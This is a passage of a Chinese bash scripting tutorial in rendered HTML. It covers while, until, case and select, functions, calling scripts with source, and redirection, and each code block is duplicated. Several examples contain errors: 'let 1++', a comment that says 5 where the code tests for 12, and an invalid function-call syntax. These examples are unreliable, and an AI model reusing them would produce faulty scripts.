class="comment">#内嵌条件判断</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;i 等于 5，终止循环&quot;</span></span><br><span class="line">        <span class="built_in">break</span>  <span class="comment"># 当 i 等于 5 时终止循环</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">let</span> i+=2 <span class="comment">#上方条件不符合进行运算</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;跳出while循环&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="comment">#设置永为真</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;当前值：<span class="variable">$i</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$i</span> -eq 12 ]; <span class="keyword">then</span> <span class="comment">#内嵌条件判断</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;i 等于 5，终止循环&quot;</span></span><br><span class="line">        <span class="built_in">break</span>  <span class="comment"># 当 i 等于 5 时终止循环</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">let</span> i+=2 <span class="comment">#上方条件不符合进行运算</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;跳出while循环&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129022741.jpg" alt="Pasted-image-20241129022741"></p><ul><li><code>continue</code>跳出本次循环，并回到循环。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 50 ] <span class="comment">#小于50则循环</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ $((i % <span class="number">5</span>)) -eq 0 ]; <span class="keyword">then</span> <span class="comment">#i除5的余等于0时执行一次</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>为5的倍数&quot;</span></span><br><span class="line">        ((i++))</span><br><span class="line">        <span class="built_in">continue</span>  <span class="comment"># 跳出本次循环(while后面语句都的都不执行了，重新再执行一次while)</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;当前值为：<span class="variable">$i</span>&quot;</span></span><br><span class="line">    ((i++))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 50 ] <span class="comment">#小于50则循环</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ $((i % <span class="number">5</span>)) -eq 0 ]; <span class="keyword">then</span> <span class="comment">#i除5的余等于0时执行一次</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>为5的倍数&quot;</span></span><br><span class="line">        ((i++))</span><br><span class="line">        <span class="built_in">continue</span>  <span class="comment"># 跳出本次循环(while后面语句都的都不执行了，重新再执行一次while)</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;当前值为：<span class="variable">$i</span>&quot;</span></span><br><span class="line">    ((i++))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129023734.jpg" alt="Pasted-image-20241129023734"></p><h4 id="配合-管道符使用"><a href="#配合-管道符使用" class="headerlink" title="配合|管道符使用"></a>配合<code>|</code>管道符使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list | <span class="keyword">while</span> <span class="built_in">read</span> line <span class="comment">#read逐行读取cat输出的内容</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> i++</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第<span class="variable">$i</span>行：<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list | <span class="keyword">while</span> <span class="built_in">read</span> line <span class="comment">#read逐行读取cat输出的内容</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> i++</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第<span class="variable">$i</span>行：<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129024458.jpg" alt="Pasted-image-20241129024458"></p><h2 id="until循环与case判断"><a href="#until循环与case判断" class="headerlink" title="until循环与case判断"></a>until循环与case判断</h2><h3 id="until循环"><a href="#until循环" class="headerlink" title="until循环"></a>until循环</h3><h4 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">until</span> [ condition ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># commands当条件不成立才退出</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">until</span> [ condition ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># commands当条件不成立才退出</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数值累加"><a href="#数值累加" class="headerlink" title="数值累加"></a>数值累加</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>=0 i=1</span><br><span class="line"><span class="keyword">until</span> [ <span class="variable">$i</span> -gt 10 ] <span class="comment">#知道满足条件退出循环</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">sum</span>=$((sum + i))</span><br><span class="line">    <span class="built_in">let</span> 1++</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1 到 10 的和是：<span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>=0 i=1</span><br><span class="line"><span class="keyword">until</span> [ <span class="variable">$i</span> -gt 10 ] <span class="comment">#知道满足条件退出循环</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">sum</span>=$((sum + i))</span><br><span class="line">    <span class="built_in">let</span> 1++</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1 到 10 的和是：<span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129031005.jpg" alt="Pasted-image-20241129031005"></p><h3 id="case判断"><a href="#case判断" class="headerlink" title="case判断"></a>case判断</h3><h4 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="variable">$variable</span> <span class="keyword">in</span></span><br><span class="line">    pattern1)</span><br><span class="line">        <span class="comment"># 处理匹配到 pattern1 的情况</span></span><br><span class="line">        ;;</span><br><span class="line">    pattern2)</span><br><span class="line">        <span class="comment"># 处理匹配到 pattern2 的情况</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="comment"># 默认情况下执行的代码</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$variable</span> <span class="keyword">in</span></span><br><span class="line">    pattern1)</span><br><span class="line">        <span class="comment"># 处理匹配到 pattern1 的情况</span></span><br><span class="line">        ;;</span><br><span class="line">    pattern2)</span><br><span class="line">        <span class="comment"># 处理匹配到 pattern2 的情况</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="comment"># 默认情况下执行的代码</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="根据输入执行相应操作"><a href="#根据输入执行相应操作" class="headerlink" title="根据输入执行相应操作"></a>根据输入执行相应操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;修复&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在安装中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 2 <span class="comment">#等待两秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    修复)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在修复中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 2 <span class="comment">#等待两秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在卸载中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 10 <span class="comment">#等待10秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;修复&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在安装中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 2 <span class="comment">#等待两秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    修复)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在修复中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 2 <span class="comment">#等待两秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在卸载中...&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 10 <span class="comment">#等待10秒</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129032115.jpg" alt="Pasted-image-20241129032115"></p><h2 id="封装函数与脚本调用与重定向"><a href="#封装函数与脚本调用与重定向" class="headerlink" title="封装函数与脚本调用与重定向"></a>封装函数与脚本调用与重定向</h2><h3 id="封装函数"><a href="#封装函数" class="headerlink" title="封装函数"></a>封装函数</h3><blockquote><p><strong>函数封装</strong>就是指将一段可重用的代码放入一个函数中，并通过函数的参数和返回值来与外部的代码进行交互。</p></blockquote><h4 id="基本语法-3"><a href="#基本语法-3" class="headerlink" title="基本语法"></a>基本语法</h4><blockquote><p>传参变量<a href="Shell%E8%84%9A%E6%9C%AC.md#%E4%BC%A0%E5%8F%82%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">回看</a></p></blockquote><ul><li>封装方法一</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">function_name</span></span>() &#123; <span class="comment">#封装函数</span></span><br><span class="line">    <span class="comment"># commands</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name(传递的参数) <span class="comment">#调用</span></span><br><span class="line">```bash</span><br><span class="line"><span class="function"><span class="title">function_name</span></span>() &#123; <span class="comment">#封装函数</span></span><br><span class="line">    <span class="comment"># commands</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name(传递的参数) <span class="comment">#调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>封装方法二</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> function_name &#123; <span class="comment">#封装函数</span></span><br><span class="line">    <span class="comment"># commands</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name(传递的参数) <span class="comment">#调用</span></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">function</span> function_name &#123; <span class="comment">#封装函数</span></span><br><span class="line">    <span class="comment"># commands</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name(传递的参数) <span class="comment">#调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><ol><li>日志打印</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义日志打印函数</span></span><br><span class="line"><span class="function"><span class="title">log_message</span></span>() &#123;</span><br><span class="line"><span class="comment">#local定义局部变量</span></span><br><span class="line">    <span class="built_in">local</span> log_level=<span class="variable">$1</span> <span class="comment">#参1</span></span><br><span class="line">    <span class="built_in">local</span> message=<span class="variable">$2</span> <span class="comment">#参二</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[<span class="variable">$log_level</span>] <span class="subst">$(date)</span>: <span class="variable">$message</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用日志函数</span></span><br><span class="line">log_message <span class="string">&quot;INFO&quot;</span> <span class="string">&quot;脚本开始执行&quot;</span></span><br><span class="line">log_message <span class="string">&quot;ERROR&quot;</span> <span class="string">&quot;文件未找到&quot;</span></span><br><span class="line">log_message <span class="string">&quot;DEBUG&quot;</span> <span class="string">&quot;正在调试模式&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义日志打印函数</span></span><br><span class="line"><span class="function"><span class="title">log_message</span></span>() &#123;</span><br><span class="line"><span class="comment">#local定义局部变量</span></span><br><span class="line">    <span class="built_in">local</span> log_level=<span class="variable">$1</span> <span class="comment">#参1</span></span><br><span class="line">    <span class="built_in">local</span> message=<span class="variable">$2</span> <span class="comment">#参二</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[<span class="variable">$log_level</span>] <span class="subst">$(date)</span>: <span class="variable">$message</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用日志函数</span></span><br><span class="line">log_message <span class="string">&quot;INFO&quot;</span> <span class="string">&quot;脚本开始执行&quot;</span></span><br><span class="line">log_message <span class="string">&quot;ERROR&quot;</span> <span class="string">&quot;文件未找到&quot;</span></span><br><span class="line">log_message <span class="string">&quot;DEBUG&quot;</span> <span class="string">&quot;正在调试模式&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129034745.jpg" alt="Pasted-image-20241129034745"><br>2. 备份文件脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义备份函数</span></span><br><span class="line"><span class="function"><span class="title">backup_file</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> source_file=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> backup_file=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$source_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;错误：源文件 <span class="variable">$source_file</span> 不存在&quot;</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># 执行备份</span></span><br><span class="line">    <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$source_file</span>&quot;</span> <span class="string">&quot;<span class="variable">$backup_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;文件已成功备份：<span class="variable">$source_file</span> 到 <span class="variable">$backup_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;要备份的文件：&quot;</span> file</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;备份的路径：&quot;</span> <span class="built_in">dir</span> </span><br><span class="line"><span class="comment"># 调用备份函数</span></span><br><span class="line">backup_file <span class="string">&quot;<span class="variable">$file</span>&quot;</span> <span class="string">&quot;<span class="variable">$dir</span>&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义备份函数</span></span><br><span class="line"><span class="function"><span class="title">backup_file</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> source_file=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> backup_file=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$source_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;错误：源文件 <span class="variable">$source_file</span> 不存在&quot;</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># 执行备份</span></span><br><span class="line">    <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$source_file</span>&quot;</span> <span class="string">&quot;<span class="variable">$backup_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;文件已成功备份：<span class="variable">$source_file</span> 到 <span class="variable">$backup_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;要备份的文件：&quot;</span> file</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;备份的路径：&quot;</span> <span class="built_in">dir</span> </span><br><span class="line"><span class="comment"># 调用备份函数</span></span><br><span class="line">backup_file <span class="string">&quot;<span class="variable">$file</span>&quot;</span> <span class="string">&quot;<span class="variable">$dir</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129040203.jpg" alt="Pasted-image-20241129040203"></p><h3 id="脚本调用"><a href="#脚本调用" class="headerlink" title="脚本调用"></a>脚本调用</h3><ol><li>用一个脚本调用另一个脚本的输出结果</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">    ./2.sh <span class="comment">#.会新的子 Shell 中执行目标脚本，变量会与当前脚本不冲突</span></span><br><span class="line">    <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">source</span> 3.sh <span class="comment">#source会加载另一个脚本文件的内容并在当前 Shell 中执行，变量可复用</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">    ./2.sh <span class="comment">#.会新的子 Shell 中执行目标脚本，变量会与当前脚本不冲突</span></span><br><span class="line">    <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">source</span> 3.sh <span class="comment">#source会加载另一个脚本文件的内容并在当前 Shell 中执行，变量可复用</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129042244.jpg" alt="Pasted-image-20241129042244"><br>2. 从另一个脚本中定义变量执行当前脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">    ./2.sh <span class="comment">#.会新的子 Shell 中执行目标脚本，变量会与当前脚本不冲突</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$test</span></span><br><span class="line">    <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">source</span> 3.sh <span class="comment">#source会加载另一个脚本文件的内容并在当前 Shell 中执行，变量可复用</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$test</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;需要执行的操作&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;安装&quot;</span> <span class="string">&quot;卸载&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">    安装)</span><br><span class="line">    ./2.sh <span class="comment">#.会新的子 Shell 中执行目标脚本，变量会与当前脚本不冲突</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$test</span></span><br><span class="line">    <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    卸载)</span><br><span class="line">        <span class="built_in">source</span> 3.sh <span class="comment">#source会加载另一个脚本文件的内容并在当前 Shell 中执行，变量可复用</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$test</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已退出操作&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> <span class="comment">#关闭脚本</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129043159.jpg" alt="Pasted-image-20241129043159"></p><h3 id="重定向操作"><a href="#重定向操作" class="headerlink" title="重定向操作"></a>重定向操作</h3><h4 id="重定向操作符"><a href="#重定向操作符" class="headerlink" title="重定向操作符"></a>重定向操作符</h4><table><thead><tr><th>流名称</th><th>文件描述符</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>标准输入（stdin）</td><td><code>0</code></td><td>用于输入数据，通常从键盘或文件中读取数据</td><td><code>cat &lt; input.txt</code></td></tr><tr><td>标准输出（stdout）</td><td><code>1</code></td><td>用于输出程序的正常结果，通常输出到终端屏幕或文件</td><td><code>echo &quot;Hello, World!&quot; &gt; output.txt</code></td></tr><tr><td>标准错误（stderr）</td><td><code>2</code></td><td>用于输出程序的错误信息，通常输出到终端屏幕，专门处理错误信息</td><td><code>ls nonexistent_file 2&gt; error.log</code></td></tr></tbody></table><ol><li>标准输入(将文本的内容当作命令的执行变量)</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l &lt; 3.txt</span><br><span class="line">```bash</span><br><span class="line"><span class="built_in">ls</span> -l &lt; 3.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129043321.jpg" alt="Pasted-image-20241129043321"></p><ol start="2"><li>标准输出(将命令执行的输出重定向到文件里面)</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> &gt; z.txt</span><br><span class="line">```bash</span><br><span class="line"><span class="built_in">ls</span> &gt; z.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129043321.jpg" alt="Pasted-image-20241129043321"><br>3. 标准错误(命令执行失败将报错重定向到文件内)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 2&gt; 1.txt</span><br><span class="line">```bash</span><br><span class="line">nmap 2&gt; 1.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129045350.jpg" alt="Pasted-image-20241129045350"><br>4. 组合使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> &gt; 2.txt 2&gt;1.txt</span><br><span class="line"></span><br><span class="line">nmap &gt; 2.txt 2&gt;1.txt</span><br><span class="line">```bash</span><br><span class="line"><span class="built_in">ls</span> &gt; 2.txt 2&gt;1.txt</span><br><span class="line"></span><br><span class="line">nmap &gt; 2.txt 2&gt;1.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129045702.jpg" alt="Pasted-image-20241129045702"></p><h2 id="文件运算符"><a href="#文件运算符" class="headerlink" title="文件运算符"></a>文件运算符</h2><h3 id="1-文件存在性和类型测试运算符"><a href="#1-文件存在性和类型测试运算符" class="headerlink" title="1. 文件存在性和类型测试运算符"></a>1. 